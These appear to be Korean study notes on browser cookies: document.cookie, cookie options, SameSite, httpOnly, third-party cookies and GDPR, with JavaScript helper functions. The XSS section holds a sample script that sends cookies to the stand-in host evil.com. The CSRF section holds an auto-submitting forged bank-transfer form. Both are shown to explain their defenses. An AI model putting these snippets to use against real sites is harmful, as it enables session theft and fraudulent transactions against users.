
# 🍪 쿠키와 `document.cookie` 완벽 가이드

## 📌 쿠키란?
- **브라우저에 저장되는 작은 문자열** (RFC 6265 표준)
- **서버가 Set-Cookie 헤더로 생성** → 브라우저에 저장 → 서버 재접속 시 Cookie 헤더로 자동 전송

**주요 용도:** 사용자 식별 (세션 관리, 로그인 상태 유지)

---

## 📌 쿠키 읽기

```javascript
alert(document.cookie); // 출력 예: user=John; theme=dark
```

- `document.cookie`는 `name=value;` 형태 문자열 반환
- 개별 쿠키 접근: split/정규식 활용 or 헬퍼 함수 사용

```javascript
function getCookie(name) {
  let matches = document.cookie.match(new RegExp(
    "(?:^|; )" + name.replace(/([\.$?*|{}()\[\]\\\/\+^])/g, '\$1') + "=([^;]*)"
  ));
  return matches ? decodeURIComponent(matches[1]) : undefined;
}
```

---

## 📌 쿠키 쓰기

```javascript
document.cookie = "user=John";
document.cookie = encodeURIComponent("my name") + "=" + encodeURIComponent("John Smith");
```

- 다른 쿠키는 유지, 해당 이름만 갱신
- 이름/값은 `encodeURIComponent`로 인코딩 필요

---

## 📌 쿠키 옵션

```javascript
document.cookie = "user=John; path=/; domain=site.com; expires=Tue, 19 Jan 2038 03:14:07 GMT; max-age=3600; secure; samesite=Strict";
```

| 옵션 | 설명 |
| ---- | ---- |
| **path** | 쿠키가 적용될 URL 경로 (기본: 현재 경로) |
| **domain** | 접근 가능한 도메인 (기본: 현재 도메인) |
| **expires** | 만료 일시 (GMT 형식) |
| **max-age** | 만료 기간 (초 단위) |
| **secure** | HTTPS에서만 전송 |
| **samesite** | Cross-Site 요청 시 쿠키 전송 제한 (Strict/Lax) |

---


## 📌 XSS (Cross-Site Scripting) 공격

### 🚨 동작 원리
- 악의적인 JS 코드가 삽입되어 사용자의 쿠키(`document.cookie`)를 탈취

```html
<script>
  fetch("https://evil.com/steal?cookie=" + document.cookie);
</script>
```

### 🛡️ 방어 방법
- **httpOnly 쿠키 사용** → JS에서 쿠키 접근 불가
- Content Security Policy (CSP) 설정
- 사용자 입력 데이터 철저히 필터링 (`<script>` 같은 태그 제거)
- 쿠키는 사용자 식별용, 민감한 정보는 절대 저장 X

---

## 📌 XSRF (Cross-Site Request Forgery) 공격

### 🚨 동작 원리
- 사용자가 **로그인 상태**일 때, 악성 사이트가 `POST` 요청 전송 → 쿠키 자동 포함 → 피해 발생

```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="hacker">
  <input type="hidden" name="amount" value="1000000">
  <input type="submit">
</form>
<script>document.forms[0].submit();</script>
```

### 🛡️ 방어 방법
- `samesite` 옵션 (`Strict` or `Lax`) → 외부 요청 시 쿠키 전송 제한
- CSRF Token 사용 (서버가 발급, 클라이언트는 요청마다 포함)
- Referer/Origin 체크 (서버단에서 요청 출처 확인)

---


## 📌 samesite 옵션

| 값 | 특징 |
| --- | ---- |
| `Strict` | 외부 사이트 요청엔 쿠키 전송 안 함 |
| `Lax` | 안전한 메서드(GET) + 최상위 탐색만 허용 |
| (미지정) | 기본은 Lax, 브라우저마다 다를 수 있음 |

---

## 📌 쿠키 삭제

```javascript
document.cookie = "user=; max-age=0";
```

or 헬퍼 함수:

```javascript
function deleteCookie(name) {
  setCookie(name, "", {'max-age': -1});
}
```

---

## 📌 httpOnly (서버 설정)

- JS에서 쿠키 접근 불가 (`document.cookie`로 읽기 X)
- XSS 공격 방어용

---

## 📌 서드 파티 쿠키

- 다른 도메인에서 설정한 쿠키
- 추적/광고 목적으로 사용 → 일부 브라우저 기본 차단

---

## 📌 GDPR

- 쿠키 사용 시 **사용자 동의 필요 (특히 추적/식별 쿠키)**

---

## 📌 쿠키 관련 헬퍼 함수

```javascript
function setCookie(name, value, options = {}) {
  options = { path: '/', ...options };
  if (options.expires instanceof Date) options.expires = options.expires.toUTCString();
  let updatedCookie = encodeURIComponent(name) + "=" + encodeURIComponent(value);
  for (let optionKey in options) {
    updatedCookie += "; " + optionKey;
    let optionValue = options[optionKey];
    if (optionValue !== true) updatedCookie += "=" + optionValue;
  }
  document.cookie = updatedCookie;
}
```

---

## ✅ 요약

- `document.cookie` → 쿠키 읽기/쓰기
- 이름/값 인코딩 필요 (`encodeURIComponent`)
- 옵션: `path`, `domain`, `expires`, `max-age`, `secure`, `samesite`
- 제한: 4KB, 약 20개
- XSRF 방지: `samesite` 옵션
- XSS 방지: `httpOnly` (서버 설정)
